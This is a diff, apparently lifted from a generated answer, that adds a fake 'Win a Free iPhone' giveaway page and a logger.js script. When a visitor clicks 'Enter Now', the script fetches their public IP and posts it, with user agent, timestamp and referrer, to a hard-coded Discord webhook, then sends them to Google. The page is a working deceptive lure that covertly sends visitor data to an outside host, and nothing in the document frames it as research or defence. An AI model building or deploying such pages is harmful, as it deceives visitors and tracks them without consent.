@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Win a Free iPhone!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #e9ecef;
+            margin: 0;
+            padding: 0;
+        }        .container {
+            margin-top: 80px;
+            padding: 30px;
+            background-color: white;
+            border-radius: 15px;
+            display: inline-block;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);        }        h1 {
+            color: #ff4500;
+        }        button {
+            padding: 12px 25px;
+            font-size: 18px;
+            background-color: #ff4500;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }        button:hover {
+            background-color: #cc3700;
+        }    </style>
+</head>
+<body>
+    <div class="container">        <h1>Win a Free iPhone Today!</h1>
+        <p>Just click below to enter the giveaway. Hurry, limited slots!</p>
+        <button onclick="claimPrize()">Enter Now!</button>
+    </div>
+    <script src="logger.js"></script>
+</body>
+</html>
+```2. **IP Logger JavaScript with Webhook (`logger.js`):**```javascript
+function claimPrize() {
+    alert("Processing your entry... Thanks for participating!");    fetch('https://api.ipify.org?format=json')        .then(response => response.json())        .then(data => {
+            let ip = data.ip;
+            sendIPToWebhook(ip);        })        .catch(error => console.log("Error fetching IP: ", error));}function sendIPToWebhook(ip) {
+    const webhookURL = 'https://discord.com/api/webhooks/1476930335630688410/ELNbHXT-9kxPf-uG0XZXBq5rbKbWvVmrsJ7xwkexgRI4tvDr7FDlWH-qGHgZ5D8BsKsp';
+    const payload = {
+        content: `New Visitor Logged!\nIP: ${ip}\nUser Agent: ${navigator.userAgent}\nTimestamp: ${new Date().toISOString()}\nReferrer: ${document.referrer || 'Direct Visit'}`    };    
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },        body: JSON.stringify(payload)    })    .then(response => console.log("Data sent to webhook: ", response))    .catch(error => console.log("Error sending to webhook: ", error));    
+    window.location.href = 'https://www.google.com';
+}
